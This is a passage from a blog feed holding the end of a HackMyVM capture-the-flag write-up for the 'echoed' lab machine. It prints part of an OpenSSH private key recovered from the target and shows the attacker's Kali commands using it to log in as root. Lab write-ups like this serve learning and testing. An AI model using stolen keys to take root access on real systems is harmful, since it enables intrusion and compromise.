PEwbtyyc/PE9vFYIwBENuUlz6jXT1TuhZ1FyY+pidQ607l0E+M7zwGrMb+PQP8l7KpMkbX
Y8IQydqs/XzNziO9RnQusXFcVCbsAKmYsLeCkbzOn4yWitA5cpgLs/bXrqGs2dFE/d8ifi
mLodRZj6/vLGwAAACBAPlu5m8XoaGK1XkF7Vlik4YoCNPnavRGB91fJg/M7M5YKKR7Y1ll
jmNX4TIIj+U5CuvIBf6TVS1fwn95ANv2o8oxVG7e4AHZpt3GQtP2yDLiHshzsj0W6NzzeI
dB2BClQgvukjzremccz8rHV3L9nYr1LYF/Rs6GgvsD72AZzgNJAAAAgQDygxopioQQ/Dup
z6hTWng1LXgZ0EUBMqN5tCcGgTHvAeykiWpjl/zrK5QjDmjhKzYaHPBI/sUdgVA8o2R8ne
hbS9N2ogWiJAF/XaU5behAdg1lTkfk6xNpF/1CVuK2gItW7yF1AGLMPLhD8nVlyx1429Ln
eysx2HEd+7b7p0dU7QAAAAtyb290QGVjaG9lZAECAwQFBg<span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">vim</span> id_rsa                                                                                                                                                                                                <span class="token punctuation">[</span><span class="token number">0</span>:54:10<span class="token punctuation">]</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">chmod</span> <span class="token number">600</span> id_rsa                                                                                                                                                                                          <span class="token punctuation">[</span><span class="token number">0</span>:54:16<span class="token punctuation">]</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa root@192.168.1.110                                                                                                                                                                          <span class="token punctuation">[</span><span class="token number">0</span>:54:22<span class="token punctuation">]</span>
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.1.110 (192.168.1.110)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:oQu3q+1PdKxh+LYJGhUzk9Xi5XkHM5TN+iho+LIwgPo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? ye
Please type '</span><span class="token function">yes</span><span class="token string">', '</span>no<span class="token string">' or the fingerprint: yes
Warning: Permanently added '</span><span class="token number">192.168</span>.1.110' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.
Linux echoed <span class="token number">4.19</span>.0-12-amd64 <span class="token comment">#1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec <span class="token number">17</span> 02:25:52 <span class="token number">2020</span>
root@echoed:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root</code></pre>
<p>拿到rootshell</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>xdg-open</tag>
      </tags>
  </entry>
</search>
